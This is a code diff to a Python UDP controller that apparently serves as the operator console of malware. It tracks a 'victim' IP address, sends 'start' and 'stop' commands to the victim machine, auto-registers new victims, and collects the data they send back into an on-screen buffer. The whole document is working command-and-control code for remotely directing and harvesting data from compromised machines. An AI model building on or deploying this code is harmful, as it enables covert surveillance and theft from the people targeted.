@@ -11,6 +11,9 @@ The controller runs a listener in a separate thread and allows user input to con
 import socket, os
 import json
 import threading
+from typing import Optional
+
+from pyexpat.errors import messages
 
 IP = '10.0.2.15'
 
@@ -58,13 +61,14 @@ banner = """
 """
 
 class ControllerServer:
-    def __init__(self, host: str = "127.0.0.1", port_listen: int = 9999, port_send: int = 9998):
-        self.host = host
+    def __init__(self, ip_victim: Optional[str] = None, port_listen: int = 9999, port_send: int = 9998):
+        self.ip_victim = ip_victim
         self.port_listen = port_listen
         self.port_send = port_send
         self.buffer = ""
+        self.info_victim = ""
 
-    def send_command(self, message: bool, timeout: float = 2.0):
+    def send_command(self, message: str, timeout: float = 2.0):
 
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             sock.settimeout(timeout)
@@ -72,8 +76,8 @@ class ControllerServer:
                 request = {
                     "command": message
                 }
-                sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
-                print(f"Đã gửi {sent} bytes tới {self.host}:{self.port_send}")
+                sent = sock.sendto(json.dumps(request).encode(), (self.ip_victim, self.port_send))
+                print(f"Đã gửi {sent} bytes tới {self.ip_victim}:{self.port_send}")
             except socket.timeout:
                 pass
             except Exception as e:
@@ -84,7 +88,7 @@ class ControllerServer:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         sock.bind(('0.0.0.0', self.port_listen))
         sock.settimeout(0.5)
-        print(f"UDP server listening on {self.host}:{self.port_listen} (press Ctrl+C to stop)")
+        #print(f"UDP server listening on {self.ip_victim}:{self.port_listen} (press Ctrl+C to stop)")
 
         try:
             while True:
@@ -93,6 +97,11 @@ class ControllerServer:
                     data = json.loads(data.decode())
                     data_str = data.get("message", "")
                     signal = data.get("signal", False)
+                    ip_victim = data.get("from_ip", "")
+                    if self.ip_victim is None or self.ip_victim != ip_victim:
+                        self.ip_victim = ip_victim
+                        self.send_command(message="Server_active")
+
                     if signal:
                         self.buffer += data_str
                         os.system('clear')
@@ -117,30 +126,17 @@ class ControllerServer:
             sock.close()
             print("Socket closed. Bye.")
 
-def send_loop(controller: ControllerServer):
-    while True:
-        command = input("Send cmd (start/stop/exit): ").strip().lower()
-        if command == "start":
-            controller.send_command(True)
-        elif command == "stop":
-            controller.send_command(False)
-        elif command == "exit":
-            print("Exiting...")
-            break
-        else:
-            print("Unknown command.")
-
 def main():
-    controller = ControllerServer(host=IP)
+    controller = ControllerServer(ip_victim=IP)
     listener_thread = threading.Thread(target=controller.listen_clients, daemon=True)
     listener_thread.start()
     print("\033[32m" + banner + "\033[0m")
     while True:
         command = input("Send cmd (start/stop/exit): ").strip().lower()
         if command == "start":
-            controller.send_command(True)
+            controller.send_command(command)
         elif command == "stop":
-            controller.send_command(False)
+            controller.send_command(command)
         elif command == "exit":
             print("Exiting...")
             break
